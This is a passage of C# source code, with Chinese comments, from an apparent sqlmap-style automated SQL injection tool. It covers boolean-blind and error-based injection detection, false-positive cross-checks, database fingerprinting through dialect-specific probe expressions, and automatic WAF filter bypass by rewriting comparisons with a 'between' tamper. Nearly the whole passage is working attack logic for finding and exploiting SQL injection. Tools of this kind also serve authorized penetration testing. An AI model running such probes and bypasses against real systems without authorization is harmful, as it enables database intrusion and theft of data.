                        if (_b64ActiveCount == 0 && b64TempEnabled && !hits.Any(h => "base64encode".Equals(h.AutoTamper, StringComparison.OrdinalIgnoreCase)))
                        {
                            Bypass.EncodeToolRegistry.SetEnabled(config, "base64encode", false);
                        }
                    }
                }
            }
            return hits;
        }

        /// <summary>
        /// 注入点利用价值评分（全产品统一口径，GUI命中应用/CMD PickBest共用）：
        /// Union(50)取数最快 &gt; 报错(40) &gt; 布尔盲注(30)逐位判断 &gt; DNS(25)外带依赖出网 &gt; 堆叠(20) &gt; 时间(10)最慢
        /// </summary>
        public static int ExploitPriority(InjectPoint inp)
        {
            if (inp.InjectType == InjectType.Union)
            {
                return 50;
            }
            if (inp.InjectType == InjectType.Error)
            {
                return 40;
            }
            //堆叠点：取数速度等同时间盲注，但具备多语句写操作/命令执行能力，价值高于纯时间盲注
            if (inp.InjectType == InjectType.Stacked)
            {
                return 20;
            }
            //DNS外带点：取数经DNS信道带出（每段一次请求，远快于盲注），但依赖目标出网+DNSLog配置
            if (inp.InjectType == InjectType.Dns)
            {
                return 25;
            }
            //时间盲注（独立注入类型；BoolInjectType.Time 兼容旧记录）
            if (inp.InjectType == InjectType.Time || inp.BoolInjectType == BoolInjectType.Time)
            {
                return 10;
            }
            return 30;
        }

        /// <summary>
        /// 预检并发波执行器：一波并发发出全部探针请求（并发度限5，防脆弱目标/限流WAF被瞬时打满），
        /// 响应收齐后由调用方本地统一判定。有效响应（StatusCode>0）的RunTime入并发段样本池（降级使用）。
        /// 限速语义由BypassPipeline Stage4时间槽预约兜底：配置延时/限速时波内请求自动串行间隔。
        /// </summary>
        private static async Task<List<(string kind, string payload, HttpResponse resp)>> RunPreWave(
            Ctx ctx, List<(string kind, string reqTxt, string payload)> items)
        {
            using var gate = new SemaphoreSlim(5);
            var tasks = items.Select(async it =>
            {
                await gate.WaitAsync().ConfigureAwait(false);
                try
                {
                    ctx.Config.CheckStop();
                    HttpResponse r = await Send(ctx, it.reqTxt, it.payload).ConfigureAwait(false);
                    if (r.StatusCode > 0 && r.RunTime > 0)
                    {
                        lock (ctx.ConcurrentTimeSamples)
                        {
                            ctx.ConcurrentTimeSamples.Add(r.RunTime);
                        }
                    }
                    return (it.kind, it.payload, r);
                }
                finally
                {
                    gate.Release();
                }
            });
            return (await Task.WhenAll(tasks).ConfigureAwait(false)).ToList();
        }

        /// <summary>动态性证据判定：响应剥离payload反射与动态特征后与模板比对，true=页面变化（动态）/false=未变/null=响应无效</summary>
        private static bool? EvidenceChanged(Ctx ctx, HttpResponse resp, string payload)
        {
            try
            {
                if (resp == null || resp.StatusCode <= 0)
                {
                    return null;
                }
                string txt = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, resp.BodyTxt ?? "");
                txt = InjectTools.StripPayloadReflection(txt, payload);
                return RatioVsTemplate(ctx, txt) < DetectTuning.UpperBound;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 布尔盲注/内联查询：真值双发+假值双发交叉验证（假阳性复核）
        /// </summary>
        private static async Task<InjectPoint?> TryBoolean(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, bool isInline)
        {
            if (string.IsNullOrWhiteSpace(test.ResponseComparison))
            {
                return null;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string truePayload = Rep(ctx, ph, test.RequestPayload) + comment;
            string falsePayload = Rep(ctx, ph, test.ResponseComparison) + comment;
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix));

            HttpResponse falseResp = await Send(ctx, reqTxt, falsePayload).ConfigureAwait(false);
            string falseTxt = Clear(ctx, falseResp.BodyTxt, ReflectionValue(prefix, falsePayload, suffix));
            double rFalse = RatioVsTemplate(ctx, falseTxt);
            HttpResponse trueResp = await Send(ctx, reqTxt, truePayload).ConfigureAwait(false);
            string trueTxt = Clear(ctx, trueResp.BodyTxt, ReflectionValue(prefix, truePayload, suffix));
            double rTrue = RatioVsTemplate(ctx, trueTxt);

            //空body不拒收：假值查询无记录时页面返回200+空body是合法响应（Access/ASP常见），
            //此时与模板ratio≈0反而是最清晰的真假差异；仅状态码无效（<=0，网络层失败）或错误码才放弃
            if (ConstData.ErrorHttpCode.Contains(trueResp.StatusCode) || ConstData.ErrorHttpCode.Contains(falseResp.StatusCode)
                || trueResp.StatusCode <= 0 || falseResp.StatusCode <= 0)
            {
                return null;
            }
            //WAF拦截假象否决（sqlmap WAF block-artifact guard同款）：真值被拦（406/429等）而假值/原始请求正常，
            //是WAF在应答而非数据库——真值本应复现正常页面，这种状态码非对称是典型误报
            if (DetectTuning.WafBlockCodes.Contains(trueResp.StatusCode) && falseResp.StatusCode < 400 && (ctx.OrigResponse?.StatusCode ?? 200) < 400)
            {
                Log.Show("真值响应状态码" + trueResp.StatusCode + "而假值/原始请求正常，疑似WAF拦截假象（非SQL注入），判定误报，跳过！");
                return null;
            }

            //matchRatio自适应锚点（sqlmap同款）：假值页ratio落在中区(DetectTuning.LowerBound,DetectTuning.UpperBound)时以其为锚，
            //真值页只需比锚高出DetectTuning.DiffTolerance即视为与模板一致——适配真假页面差异极小的目标（固定0.98阈值会漏）
            double anchor = (rFalse >= DetectTuning.LowerBound && rFalse <= DetectTuning.UpperBound) ? rFalse : -1;
            bool TrueLike(double r) => r >= DetectTuning.UpperBound || (anchor >= 0 && (r - anchor) > DetectTuning.DiffTolerance);

            //判定一：状态码差异（与旧检测一致）
            bool byCode = ctx.OrigResponse != null
                && ctx.OrigResponse.StatusCode == trueResp.StatusCode
                && trueResp.StatusCode != falseResp.StatusCode;
            //判定二：ratio判定
            bool byRatio = TrueLike(rTrue) && !TrueLike(rFalse) && (rTrue - rFalse) >= DetectTuning.MinDelta;
            if (!byCode && !byRatio)
            {
                return null;
            }

            //交叉验证：全新随机占位的第二组真值/假值，排除页面抖动与回显干扰
            PayloadPlaceholder ph2 = new PayloadPlaceholder();
            string prefix2 = Rep(ctx, ph2, boundary.Prefix);
            string suffix2 = Rep(ctx, ph2, boundary.Suffix);
            string comment2 = Rep(ctx, ph2, test.RequestComment);
            string truePayload2 = Rep(ctx, ph2, test.RequestPayload) + comment2;
            string falsePayload2 = Rep(ctx, ph2, test.ResponseComparison) + comment2;
            string reqTxt2 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, truePayload2), prefix2, suffix2));
            HttpResponse true2Resp = await Send(ctx, reqTxt2, truePayload2).ConfigureAwait(false);
            double rTrue2 = RatioVsTemplate(ctx, Clear(ctx, true2Resp.BodyTxt, ReflectionValue(prefix2, truePayload2, suffix2)));
            if (!TrueLike(rTrue2))
            {
                return null;
            }
            HttpResponse false2Resp = await Send(ctx, reqTxt2, falsePayload2).ConfigureAwait(false);
            double rFalse2 = RatioVsTemplate(ctx, Clear(ctx, false2Resp.BodyTxt, ReflectionValue(prefix2, falsePayload2, suffix2)));
            if (TrueLike(rFalse2) || (rTrue2 - rFalse2) < DetectTuning.MinDelta)
            {
                return null;
            }

            //invalid-bignum/invalid-string反证（假阳性复核，where=1追加语义全类型覆盖）：
            //不可能存在的值（大负数/长随机串）替换原值后附加真值payload——真注入时记录不存在，页面应偏离模板（同假值页）；
            //若页面仍与模板一致，说明参数未进入查询条件，真假差异是记录存在性/页面反射造成的假象，判定误报
            if (where == 1)
            {
                bool numeric = ctx.NumericValue;
                string invalidValue = numeric
                    ? "-" + new Random().Next(100000000, 2000000000).ToString()
                    : MyTools.RandStr(24).ToLower();
                string invalidKind = numeric ? "invalid-bignum" : "invalid-string";
                string reqBig = BuildRequest(ctx, MarkedValue(ctx, invalidValue, prefix, suffix));
                HttpResponse bigResp = await Send(ctx, reqBig, truePayload).ConfigureAwait(false);
                double rBig = RatioVsTemplate(ctx, Clear(ctx, bigResp.BodyTxt, ReflectionValue(prefix, truePayload, suffix)));
                if (TrueLike(rBig))
                {
                    Log.Show(invalidKind + "反证：不可能值替换后页面无差异（ratio=" + rBig.ToString("F4") + "），布尔命中判定为误报，跳过！");
                    return null;
                }
            }

            string techName = isInline ? "内联查询" : "布尔盲注";
            Log.Warning("发现" + techName + "注入！用例：" + test.Title);
            InjectPayloadManager.RecordHit(test);
            Log.Show("页面ratio(false|true|true2|false2)：" + rFalse.ToString("F4") + "|" + rTrue.ToString("F4") + "|" + rTrue2.ToString("F4") + "|" + rFalse2.ToString("F4"));

            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Blind;
            inp.DBType = ResolveDb(test, ctx);
            //识别真假页面判断条件，供盲注取数（直接从模板词表挑选：在真值原文出现、假值原文不出现，
            //避免CheckTheKey的时间兜底把快速页面误判成时间盲注，也避免选中会被payload回显干扰的词）
            //三级兜底：关键字→状态码→长度(大于/小于)
            void SelectJudge(HttpResponse t, HttpResponse f)
            {
                inp.BoolInjectType = BoolInjectType.KeyWord;
                string? key = FindBlindKey(ctx.Template, t.BodyTxt, f.BodyTxt, out bool revers);
                inp.Revers = revers;
                if (!string.IsNullOrEmpty(key))
                {
                    inp.CheckValue = key;
                    Log.Success("发现盲注判断值！" + key + (revers ? "（反向）" : ""));
                }
                else if (t.StatusCode != f.StatusCode)
                {
                    inp.BoolInjectType = BoolInjectType.Code;
                    inp.CheckValue = t.StatusCode.ToString();
                    inp.Revers = false;
                    Log.Show("响应状态码" + inp.CheckValue + "可以作为盲注判断条件！");
                }
                else
                {
                    //长度兜底：ratio已证实真假页面有差异，用假值页长度做大于/小于判断
                    inp.BoolInjectType = t.BodyLength > f.BodyLength ? BoolInjectType.MaxLength : BoolInjectType.MinLength;
                    inp.CheckValue = f.BodyLength.ToString();
                    inp.Revers = false;
                    Log.Show("未找到稳定关键字，使用响应长度" + (inp.BoolInjectType == BoolInjectType.MaxLength ? ">" : "<") + inp.CheckValue + "作为盲注判断条件！");
                }
            }
            //判定条件回放：选出的判断方式必须在指定真/假响应上判定正确（真→true、假→false）
            bool JudgeOk(HttpResponse t, HttpResponse f)
            {
                return JudgeByRecord(inp, t) && !JudgeByRecord(inp, f);
            }

            SelectJudge(trueResp, falseResp);
            //回放验证：用交叉验证的全新随机第二组真/假响应验证判断条件（零额外发包）；
            //失败则用第二组响应重新选取并反向回放（关键字不稳自动降级到状态码/长度）
            if (!JudgeOk(true2Resp, false2Resp))
            {
                Log.Warning("盲注判断条件回放未通过（方式=" + inp.BoolInjectType + "），用第二组响应重新选取……");
                SelectJudge(true2Resp, false2Resp);
                if (JudgeOk(trueResp, falseResp))
                {
                    Log.Success("回放降级后判断条件有效：" + inp.BoolInjectType + "=" + inp.CheckValue);
                }
                else if (TrySelectSimilarityJudge(ctx, inp, trueResp, falseResp, true2Resp, false2Resp))
                {
                    //三档兜底取数oracle（sqlmap同款：取数复用检测比对引擎）——离散判断依据
                    //（关键字/状态码/长度）双向回放均失败=高动态页面无稳定离散特征，降级为页面相似度判定
                    Log.Success("离散判断依据不可用，降级为页面相似度判定（模式=" +
                        (inp.SimilarMode == "skeleton" ? "结构骨架" : inp.SimilarMode == "text" ? "纯文本" : "清动态模板") +
                        "，阈值=" + inp.SimilarCutoff.ToString("F3") + "），取数按相似度oracle执行！");
                }
                else
                {
                    Log.Warning("判断条件双向回放均未通过（页面可能动态性过强），取数可能不稳定，建议在数据操作页手工指定判断依据！");
                }
            }
            inp.TestPayload = truePayload;
            inp.Where = where;
            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            //防脏数据校验基线：记录真/假页状态码，取数探测出现意外码时作废重发+触发逐字符NOT复核
            inp.TrueCode = trueResp.StatusCode;
            inp.FalseCode = falseResp.StatusCode;
            //全量反证（sqlmap checkFalsePositives同款）：randInt等式系列——等式必须真、不等式必须假、
            //非法语句（N M）必须假；按level迭代多轮，任一轮失真即判定误报
            if (!await PassFalsePositiveCheck(ctx, inp).ConfigureAwait(false))
            {
                Log.Show("布尔命中经全量反证（randInt等式系列）确认失真，判定误报，跳过！");
                return null;
            }
            //布尔指纹库识别（sqlmap heuristicCheckDbms同款）：库型未知时用方言NULL求值探针判别，
            //识别成功重烘焙利用标记（库型影响注释符MySQL=#其他=-- ），供后续取数按正确方言拼接
            if (inp.DBType == DBType.UnKnow)
            {
                DBType fpDb = await HeuristicCheckDbms(ctx, inp).ConfigureAwait(false);
                if (fpDb != DBType.UnKnow)
                {
                    inp.DBType = fpDb;
                    if (!ctx.DbCandidates.Contains(fpDb))
                    {
                        ctx.DbCandidates.Add(fpDb);
                    }
                    inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
                    inp.RequestTxt = BuildRequest(ctx, inp.PValue);
                    Log.Success("布尔指纹库识别：后端数据库可能为 " + fpDb + "（方言探针双验证通过）！");
                }
            }
            //'>'过滤自动适配：盲注二分取数全靠'>'，被WAF过滤时取数静默失败；
            //自动验证'>'oracle，失效则尝试between重写并真/假双验证，有效则记录AutoTamper随注入记录保存
            inp.AutoTamper = await AdaptGtFiltering(ctx, inp).ConfigureAwait(false);
            Log.Success("存在" + techName + "payload：" + truePayload);
            return inp;
        }

        /// <summary>
        /// 全量反证（sqlmap checkFalsePositives同款）：利用已建立的盲注oracle发送randInt等式系列——
        /// 等式必须判真、不等式必须判假、非法语句（N M，语法错误）必须判假；按检测level迭代（上限3轮），
        /// 任一轮失真即判定误报。时间类命中不做此反证（每轮需多次延时请求，已有三/四次确认兜底）。
        /// </summary>
        private static async Task<bool> PassFalsePositiveCheck(Ctx ctx, InjectPoint inp)
        {
            try
            {
                int rounds = Math.Max(1, Math.Min(3, ctx.Config.DataConfig.DetectLevel));
                Random rand = new Random();
                for (int i = 0; i < rounds; i++)
                {
                    int n1, n2, n3;
                    do
                    {
                        n1 = rand.Next(1, 99);
                        n2 = rand.Next(1, 99);
                        n3 = rand.Next(1, 99);
                    }
                    while (!(n3 > n2 && n2 > n1));
                    //等式必须为真
                    if (!await JudgeCondition(ctx, inp, n1 + "=" + n1, true).ConfigureAwait(false))
                    {
                        return false;
                    }
                    //不等式必须为假
                    if (!await JudgeCondition(ctx, inp, n1 + "=" + n3, false).ConfigureAwait(false))
                    {
                        return false;
                    }
                    if (!await JudgeCondition(ctx, inp, n3 + "=" + n2, false).ConfigureAwait(false))
                    {
                        return false;
                    }
                    //等式必须为真
                    if (!await JudgeCondition(ctx, inp, n2 + "=" + n2, true).ConfigureAwait(false))
                    {
                        return false;
                    }
                    //非法语句必须为假（语法错误页≠真值页）
                    if (!await JudgeCondition(ctx, inp, n3 + " " + n2, false).ConfigureAwait(false))
                    {
                        return false;
                    }
                }
                return true;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch
            {
                //反证链路异常不否决命中
                return true;
            }
        }

        /// <summary>按注入点记录判定响应真假（Similarity模式自动携带比对基准/投影模式/阈值/动态特征）</summary>
        private static bool JudgeByRecord(InjectPoint inp, HttpResponse resp)
        {
            return TruthOracle.IsTrue(resp, inp.CheckValue, inp.Revers, inp.BoolInjectType,
                inp.SimilarTemplate, inp.SimilarMode, inp.SimilarCutoff, inp.DynamicFeatures);
        }

        /// <summary>
        /// 相似度oracle选取（高动态页面三档兜底的取数侧闭环）：两组真/假响应在检测期比对基准上
        /// 有稳定区分间隙（最小真ratio-最大假ratio≥0.02）时，将判断方式切换为Similarity，
        /// 比对基准按检测期已确定的降级档位携带（skeleton/text/清动态模板），阈值取真假ratio中点
        /// </summary>
        private static bool TrySelectSimilarityJudge(Ctx ctx, InjectPoint inp,
            HttpResponse t1, HttpResponse f1, HttpResponse t2, HttpResponse f2)
        {
            //正常模板模式（""）模板是清动态后的，比对前必须同口径清动态——
            //否则噪声把真/假页ratio一并压低，区分间隙消失（误判降级不可用）
            bool normalMode = ctx.TemplateSkeleton == null && ctx.TemplateTextOnly == null;
            double R(HttpResponse r)
            {
                string body = r.BodyTxt ?? "";
                if (normalMode)
                {
                    body = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, body);
                }
                return RatioVsTemplate(ctx, body);
            }
            double minT = Math.Min(R(t1), R(t2));
            double maxF = Math.Max(R(f1), R(f2));
            if (minT - maxF < 0.02)
            {
                return false; //真假页在相似度维度也无区分间隙，相似度oracle同样不可用
            }
            if (ctx.TemplateSkeleton != null)
            {
                inp.SimilarMode = "skeleton";
                inp.SimilarTemplate = ctx.TemplateSkeleton;
            }
            else if (ctx.TemplateTextOnly != null)
            {
                inp.SimilarMode = "text";
                inp.SimilarTemplate = ctx.TemplateTextOnly;
            }
            else
            {
                inp.SimilarMode = "";
                inp.SimilarTemplate = ctx.Template ?? "";
                //取数侧清动态复用：特征表随记录携带（skeleton/text投影与动态特征无关，无需携带）
                inp.DynamicFeatures = ctx.Features;
            }
            if (string.IsNullOrEmpty(inp.SimilarTemplate))
            {
                return false;
            }
            inp.BoolInjectType = BoolInjectType.Similarity;
            inp.CheckValue = "";
            inp.Revers = false;
            inp.SimilarCutoff = Math.Round((minT + maxF) / 2, 4);
            return true;
        }

        /// <summary>经已建立的注入点发送条件并用oracle判定，比对期望值</summary>
        private static async Task<bool> JudgeCondition(Ctx ctx, InjectPoint inp, string condition, bool expectTrue)
        {
            HttpResponse resp = await Send(ctx, inp.RequestTxt, condition).ConfigureAwait(false);
            bool judged = JudgeByRecord(inp, resp);
            return judged == expectTrue;
        }

        /// <summary>
        /// 布尔指纹库识别（sqlmap heuristicCheckDbms同款）：布尔盲注已确认但库型未知时，
        /// 用各库方言NULL求值探针逐一判别——函数不存在→语法错误页→判假（与全量反证的
        /// "非法语句必须判假"协同）。双验证语义：正探针(SELECT expr) IS NULL必须判真
        /// 且负探针IS NOT NULL必须判假，排除页面抖动造成的偶然命中。
        /// 探针矩阵经docker真实库逐库交叉验证（MySQL/PG/MSSQL/Oracle/DM/SQLite/DB2/ClickHouse/Access实测，
        /// H2/HSQLDB/Informix为doc-derived未实测）。
        /// 顺序敏感：Oracle必须在DM前——DM无INSTR2不会命中Oracle探针，而Oracle有TO_CHAR(NULL)
        /// 会命中DM探针，靠前序Oracle探针截胡；金仓/openGauss会识别为PostgreSQL（CompatDb兼容映射，取数模板通用）。
        /// </summary>
        private static async Task<DBType> HeuristicCheckDbms(Ctx ctx, InjectPoint inp)
        {
            try
            {
                //(库型, NULL求值探针表达式)：表达式必须在本库求值为NULL、在他库报语法/函数错误
                (DBType db, string expr)[] probes =
                {
                    (DBType.MySQL, "IFNULL(QUARTER(NULL),NULL XOR NULL)"),
                    (DBType.PostgreSQL, "QUOTE_IDENT(NULL)"),
                    (DBType.SQLServer, "PARSENAME(NULL,NULL)"),
                    (DBType.Oracle, "INSTR2(NULL,NULL) FROM DUAL"),
                    (DBType.DM, "TO_CHAR(NULL) FROM DUAL"),
                    (DBType.SQLite, "JULIANDAY(NULL)"),
                    (DBType.H2, "STRINGTOUTF8(NULL)"),
                    (DBType.DB2, "MULTIPLY_ALT(NULL,NULL) FROM SYSIBM.SYSDUMMY1"),
                    (DBType.ClickHouse, "toNullable(NULL)")
                    //Access不在此数组：Jet/ODBC下无FROM标量子查询报语法错（实测），且MSysAccessObjects仅accdb存在，
                    //Access探针走下方直接WHERE形态（CVAR为Access/VBA独有函数，他库报"未定义函数"→判假）
                };
                foreach ((DBType db, string expr) in probes)
                {
                    ctx.Config.CheckStop();
                    if (!await JudgeCondition(ctx, inp, "(SELECT " + expr + ") IS NULL", true).ConfigureAwait(false))
                    {
                        continue;
                    }
                    if (!await JudgeCondition(ctx, inp, "(SELECT " + expr + ") IS NOT NULL", false).ConfigureAwait(false))
                    {
                        continue;
                    }
                    return db;
                }
                //Access专用探针（直接WHERE形态，实测mdb/ODBC可行）：CVAR(NULL)求值为NULL，
                //CVAR为Access/VBA独有函数，其他库报"未定义函数"错误页→判假，双验证排除抖动
                if (await JudgeCondition(ctx, inp, "CVAR(NULL) IS NULL", true).ConfigureAwait(false)
                    && await JudgeCondition(ctx, inp, "CVAR(NULL) IS NOT NULL", false).ConfigureAwait(false))
                {
                    return DBType.Access;
                }
                //字符串等值探针（无独有NULL求值函数的库，靠方言虚拟表区分）：等值必须判真、不等值必须判假
                (DBType db, string from)[] strProbes =
                {
                    (DBType.HSQLDB, " FROM INFORMATION_SCHEMA.SYSTEM_USERS"),
                    (DBType.Informix, " FROM SYSMASTER:SYSDUAL")
                };
                foreach ((DBType db, string from) in strProbes)
                {
                    ctx.Config.CheckStop();
                    string r1 = MyTools.RandStr(8).ToLower();
                    string r2 = MyTools.RandStr(8).ToLower();
                    if (!await JudgeCondition(ctx, inp, "(SELECT '" + r1 + "'" + from + ")='" + r1 + "'", true).ConfigureAwait(false))
                    {
                        continue;
                    }
                    if (!await JudgeCondition(ctx, inp, "(SELECT '" + r1 + "'" + from + ")='" + r2 + "'", false).ConfigureAwait(false))
                    {
                        continue;
                    }
                    return db;
                }
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch
            {
                //识别链路异常不否决命中，保持库型未知
            }
            return DBType.UnKnow;
        }

        /// <summary>
        /// '>'过滤自动适配（自动tamper适配机制）：
        /// 用户未启用任何tamper脚本时，先发送含'>'的真值条件验证'>'oracle；失真则判定'>'被过滤，
        /// 用between（NOT BETWEEN重写）本地变换真/假条件各发一次双验证，双双判定正确才采纳，
        /// 返回tamper名记录到注入点（不改动全局配置，取数恢复注入记录时自动启用对应tamper）
        /// </summary>
        private static async Task<string> AdaptGtFiltering(Ctx ctx, InjectPoint inp)
        {
            try
            {
                //用户已启用编码工具：尊重用户选择，不自动适配（用户已配置tamper则跳过）
                if (ctx.Config.ByPassConfig.EncodeTools.Any(s => s.Enable))
                {
                    return "";
                }
                int n = new Random().Next(1000, 8999);
                string condTrue = "(" + (n + 1) + ">" + n + ")";
                HttpResponse trueResp = await Send(ctx, inp.RequestTxt, condTrue).ConfigureAwait(false);
                if (JudgeByRecord(inp, trueResp))
                {
                    //'>'未被过滤，无需适配
                    return "";
                }
                Log.Warning("检测到 '>' 疑似被过滤（真值条件 " + condTrue + " 判定失真），尝试自动适配 between tamper……");
                //取 between 脚本（磁盘 scripts/between.js 优先，注册表内嵌兜底）
                EncodeToolModel? between = Bypass.RuleStore.LoadToolByKey("between");
                if (between == null)
                {
                    return "";
                }
                //本地变换验证（不动全局配置）：真/假条件经between重写后判定双双正确才采纳
                string adaptedTrue = ScriptTamperEngine.Tamper(between, condTrue);
                string condFalse = "(" + n + ">" + (n + 1) + ")";
                string adaptedFalse = ScriptTamperEngine.Tamper(between, condFalse);
                if (string.IsNullOrEmpty(adaptedTrue) || adaptedTrue == condTrue || string.IsNullOrEmpty(adaptedFalse))
                {
                    return "";
                }
                HttpResponse at = await Send(ctx, inp.RequestTxt, adaptedTrue).ConfigureAwait(false);
                HttpResponse af = await Send(ctx, inp.RequestTxt, adaptedFalse).ConfigureAwait(false);
                bool ok = JudgeByRecord(inp, at) && !JudgeByRecord(inp, af);
                if (ok)
                {
                    Log.Success("'>' 过滤自动适配成功：between（NOT BETWEEN重写）真/假双验证通过，已随注入记录保存，取数恢复记录时自动启用！");
                    return "between";
                }
                Log.Warning("'>' 疑似被过滤，between自动适配验证未通过，建议在防护绕过页手工尝试其他tamper！");
            }
            catch (Exception e)
            {
                Log.SysLog("AdaptGtFiltering:" + e.Message);
            }
            return "";
        }

        /// <summary>
        /// 报错注入：响应正则命中报错标记（Python命名组语法转.NET，基线预检防误报，复发确认）
        /// </summary>
        /// <summary>
        /// 提取检测payload [QUERY]位的预期输出（等值判定基准）：
        /// ①常量字面量形态（从原始模板提取）：'[DELIMITER_START]','1','[DELIMITER_STOP]'（或||/+连接）
        ///   两分隔符间是纯常量，预期输出即该常量（如 custom_extra ClickHouse toInt32 用例）；
        /// ②推理式形态（从渲染后payload提取，恒真 [RANDNUM]=[RANDNUM] 取THEN分支值）：
        ///   CASE WHEN (N=N) THEN x ELSE y → x；ELT(N=N, x)/MAKE_SET(N=N, x) → x；
        ///   BITCOUNT(BITSTRING_TO_BINARY('1'))（H2系）→ 1。未识别形态返回null（调用方回退匹配即命中）
        /// </summary>
        private static string? ExpectedInferenceOutput(string rawTemplate, string renderedPayload)
        {
            //①常量字面量：分隔符紧邻连接符+纯引号字面量（推理式中间含函数/子查询，不会匹配本形态）
            Match m = Regex.Match(rawTemplate, @"\[DELIMITER_START\]'\s*(?:\|\||\+|,)\s*'([^']*)'\s*(?:\|\||\+|,)\s*'\[DELIMITER_STOP\]", RegexOptions.IgnoreCase);
            if (m.Success)
            {
                return m.Groups[1].Value;
            }
            //②推理式
            m = Regex.Match(renderedPayload, @"CASE\s+WHEN\s*\(\s*\d+\s*=\s*\d+\s*\)\s*THEN\s+'?([^\s',)]+)'?\s*ELSE", RegexOptions.IgnoreCase);
            if (m.Success)
            {
                return m.Groups[1].Value;
            }
            m = Regex.Match(renderedPayload, @"(?:ELT|MAKE_SET)\s*\(\s*\d+\s*=\s*\d+\s*,\s*'?([^\s',)]+)'?\s*\)", RegexOptions.IgnoreCase);
            if (m.Success)
            {
                return m.Groups[1].Value;
            }
            if (renderedPayload.Contains("BITSTRING_TO_BINARY('1')", StringComparison.OrdinalIgnoreCase))
            {
                return "1";
            }
            return null;
        }

        private static async Task<InjectPoint?> TryError(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where)
        {
            if (string.IsNullOrWhiteSpace(test.ResponseGrep))
            {
                return null;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string pattern = Rep(ctx, ph, test.ResponseGrep).Replace("(?P<result>", "(?<result>", StringComparison.Ordinal);
            Regex regex;
            try
            {
                regex = new Regex(pattern, RegexOptions.IgnoreCase | RegexOptions.Singleline);
            }
            catch
            {
                return null;
            }
            //分隔符按库编码渲染（hex/chr服务端解码）：grep匹配原始随机串，反射的payload只含编码形态永不命中
            DBType testDb = ResolveDb(test, ctx);
            string payload = RepSql(ctx, ph, test.RequestPayload, testDb) + Rep(ctx, ph, test.RequestComment);
            //预期值精确等值判定（sqlmap output=='1' 同款）：检测payload推理式恒真（[RANDNUM]=[RANDNUM]），
            //[QUERY]位预期输出从payload提取（CASE WHEN/ELT/MAKE_SET取THEN分支值，当前用例库全为"1"）。
            //反射页即使回显分隔符，分隔符间夹的是SQL文本而非预期值——等值判定从原理上免疫反射误报，
            //取代旧的Quote回退库反射对照（对照场景捕获组必为SQL文本≠预期值，被本判定拦截）
            string? expected = ExpectedInferenceOutput(test.RequestPayload, payload);
            bool hasResultGroup = test.ResponseGrep.Contains("(?P<result>", StringComparison.Ordinal);
            //全匹配扫描取首个"捕获组==预期值"的命中（any-match-wins）：
            //页面同时回显payload（编码形态StripWithProtect中和不了）和真实报错时，非贪婪首发匹配
            //会落在反射SQL文本上（捕获组≠预期值），单匹配模式会把后方的真实命中吞掉（漏报）；
            //纯反射页所有捕获组都是SQL文本/编码残片≠预期值，扫描完自然否决（不误报）
            Match? WinMatch(string body)
            {
                foreach (Match m in regex.Matches(body))
                {
                    if (expected == null || !hasResultGroup)
                    {
                        return m; //未识别推理式或无result组的自定义用例：回退首个匹配即命中
                    }
                    Group g = m.Groups["result"];
                    //IgnoreCase：部分vector对结果做UPPER等大小写变换（如Oracle XMLType）
                    if (g.Success && string.Equals(g.Value.Trim(), expected, StringComparison.OrdinalIgnoreCase))
                    {
                        return m;
                    }
                }
                return null;
            }
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
            HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            if (ConstData.ErrorHttpCode.Contains(resp.StatusCode))
            {
                return null;
            }
            //剔除页面回显的注入payload（模糊中和，真实输出占位保护），
            //否则正则可能命中回显SQL中的分隔符字面量（如CONCAT('0x..',...,'0x..')），把SQL自身文本当成报错结果。
            //grep范围对齐sqlmap：body+响应头（含重定向Location）——报错进header/redirect的场景不再漏检
            string body1 = StripWithProtect((resp.BodyTxt ?? "") + "\n" + (resp.HeaderTxt ?? ""), payload, regex);
            Match? match = WinMatch(body1);
            if (match == null)
            {
                return null;
            }
            //等值判定下假阳性物理上不存在（偶发内容不可能恰好含随机分隔符+预期值），
            //复发确认/边界探针/基线排除已移除（对齐sqlmap单发判定，每个用例省2个请求）

            Log.Warning("发现报错注入！用例：" + test.Title);
            Group resultGroup = match.Groups["result"];
            if (resultGroup.Success && !string.IsNullOrEmpty(resultGroup.Value))
            {
                Log.Show("报错回显内容：" + resultGroup.Value);
            }

            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Error;
            inp.DBType = testDb;
            //SQLite的cast(... as int)失败不抛错（返回0），报错取数原理性不可行，忽略该命中避免误导
            if (inp.DBType == DBType.SQLite)
            {
                Log.Warning("SQLite不支持报错取数（cast失败不抛错），忽略本次报错命中");
                return null;
            }
            //确认入库后再计数（被忽略/反证否决的命中不计）
            InjectPayloadManager.RecordHit(test);
            inp.TestPayload = payload;
            inp.Where = where;
